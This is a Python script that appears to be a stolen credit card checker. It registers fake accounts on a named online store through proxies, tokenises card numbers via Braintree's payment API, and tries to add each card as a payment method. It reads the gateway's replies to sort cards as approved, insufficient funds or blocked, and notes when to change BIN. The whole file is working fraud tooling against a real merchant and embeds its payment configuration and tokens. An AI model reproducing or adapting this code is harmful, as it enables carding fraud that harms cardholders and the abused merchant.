
import base64
import json
import ssl
import certifi
import aiohttp
import asyncio
import random
import platform
from bs4 import BeautifulSoup
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: City = genaddr['city']
except KeyError: City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
async def AuthorizeCCN(cc, proxyrand):
    timeout=20
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#        
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                })
                try:
                    async with session.get(url='https://www.accurategelpacks.com/my-account/', proxy=str(proxyrand), timeout=timeout) as resp:          
                        response = await resp.text()
                        woo_regi = (BeautifulSoup(response , 'lxml')).find_all("input", {"name": "woocommerce-register-nonce"})[0]["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except IndexError:
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
                try :
                    data = {
                        #'username': f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}",
                        'email': CorreoRand,
                        'password': 'NqdvenVMc6MTBF7',
                        'woocommerce-register-nonce': woo_regi,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    async with session.post('https://www.accurategelpacks.com/my-account/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:       
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                try:
                    async with session.get('https://www.accurategelpacks.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                        noncewoo2 = (BeautifulSoup(response , 'lxml')).find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]
                        bearer = (response.split('var wc_braintree_client_token = ["')[1]).split('"];')[0]
                        bearer = json.loads(base64.b64decode(bearer))
                        bearer = bearer['authorizationFingerprint']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [UnboundLocalError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"    
                #---------------------------------REQUEST NUMERO 7------------------------------#
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Content-Type': 'application/json',
                        'Authorization': f'Bearer {bearer}',
                        'Braintree-Version': '2018-05-10',
                        'Origin': 'https://assets.braintreegateway.com',
                        'Connection': 'keep-alive',
                        'Referer': 'https://assets.braintreegateway.com/',
                    }
                    data = {
                        'clientSdkMetadata': {
                            'source': 'client',
                            'integration': 'custom',
                            'sessionId': f'{random.randint(100,999)}dc8af-0cbf-4132-b15f-d6ef661f{random.randint(1000,9999)}',
                        },
                        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                        'variables': {
                            'input': {
                                'creditCard': {
                                    "number": ccnum,
                                    "expirationMonth": mes,
                                    "expirationYear": ano,
                                    'billingAddress': {
                                        'postalCode': '33130',
                                        'streetAddress': '',
                                    },
                                },
                                'options': {
                                    'validate': False,
                                },
                            },
                        },
                        'operationName': 'TokenizeCreditCard',
                    }
                    async with session.post('https://payments.braintree-api.com/graphql', headers=headers, proxy=str(proxyrand), json=data, timeout=timeout) as resp:       
                        token = await resp.json()
                        token = token['data']['tokenizeCreditCard']['token'] 
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [UnboundLocalError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"   
                #---------------------------------REQUEST NUMERO 8------------------------------#
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://www.accurategelpacks.com',
                        'Connection': 'keep-alive',
                        'Referer': 'https://www.accurategelpacks.com/my-account/add-payment-method/',
                        # 'Cookie': 'pys_session_limit=true; pys_start_session=true; _gcl_au=1.1.744228927.1683908225; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.accurategelpacks.com/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.accurategelpacks.com/; _ga=GA1.2.352982015.1683908232; _gid=GA1.2.1332865047.1683908232; _fbp=fb.1.1683908239348.1993822590; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580=asdasdu22227%7C1685118570%7CwcuQp6CDTLFBKnC0JpWOqMbebbi5YjAhnGhEBDeK7G0%7C06bbea4e6268b844e007f7f65fe9c9293dd8d152c54d5c7a986b92dce4203fde; __kla_id=eyIkZXhjaGFuZ2VfaWQiOiJlMXNkSXBULXR3WmVLZVZ0bEVyWVFpU05ObUh6Smtkejk1M05KYk1WTXRVPS5US1hTTksiLCIkcmVmZXJyZXIiOnsidHMiOjE2ODM5MDg5ODQsInZhbHVlIjoiaHR0cHM6Ly9iaWdiYXR0ZXJ5LmNvbS9teS1hY2NvdW50L3BheW1lbnQtbWV0aG9kcy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly9iaWdiYXR0ZXJ5LmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2ODM5MDkyMTMsInZhbHVlIjoiaHR0cHM6Ly9iaWdiYXR0ZXJ5LmNvbS9teS1hY2NvdW50L3BheW1lbnQtbWV0aG9kcy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly9iaWdiYXR0ZXJ5LmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifX0=; _uetsid=6fc80840f0e011ed8abcdb4a887e2443; _uetvid=6fc7fb30f0e011edaa288b31041ab836; _gat_gtag_UA_173963323_1=1',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                    }
                    data = {
                        'payment_method': 'braintree_cc',
                        'braintree_cc_nonce_key': token,
                        'braintree_cc_device_data': '{"device_session_id":"199e8b3bf4a53170cd3a15d76e215d9d","fraud_merchant_id":null,"correlation_id":"af4777d993222b072482228a8b527580"}',
                        'braintree_cc_3ds_nonce_key': '',
                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2fdp2g4g72rc8ng/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2fdp2g4g72rc8ng"},"merchantId":"n2fdp2g4g72rc8ng","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Accurate Manufacturing, Inc.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODQwMDA3NjUsImp0aSI6IjNhMzM3NGYzLWM4MGItNGZhNi1hMTgzLTYyYzExMjQyYWUxMyIsInN1YiI6Im4yZmRwMmc0ZzcycmM4bmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4yZmRwMmc0ZzcycmM4bmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.JJCX8Mi_wLrAw-fH90cWJfuNiB0rN2pzHrAXYnf3jdxgaEJFRuwf_4KeCY5JNWTPxBATUbE_UNwkMT0YyXryVg","paypalClientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Accurate Manufacturing, Inc.","clientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","privacyUrl":"http://accurategelpacks.com/policy","userAgreementUrl":"http://accurategelpacks.com/terms","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"accuratemanufacturinginc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                        'woocommerce-add-payment-method-nonce': noncewoo2,
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1',
                    }
                    async with session.post('https://www.accurategelpacks.com/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError as e:
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"  
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('Payment method successfully added')) > 0) or  (int(response.find('1000 Approved')) > 0):
                    return "Approved", "(1000) Approved"
                elif (int(response.find('Status code 2001: Insufficient Funds')) > 0) or (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                    for i in response.split("\n"):
                        if 'There was an error saving your payment method' in i:
                            Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                    return "Approved", Message
                elif int(response.find('Status code risk_threshold:')) > 0 :
                    return "Gateway Rejected: CHANGE BIN"
                elif int(response.find('There was an error saving your payment method')) > 0 :
                    for i in response.split("\n"):
                        if 'There was an error saving your payment method' in i:
                            
                            Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                    return Message
                else :
                    return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()
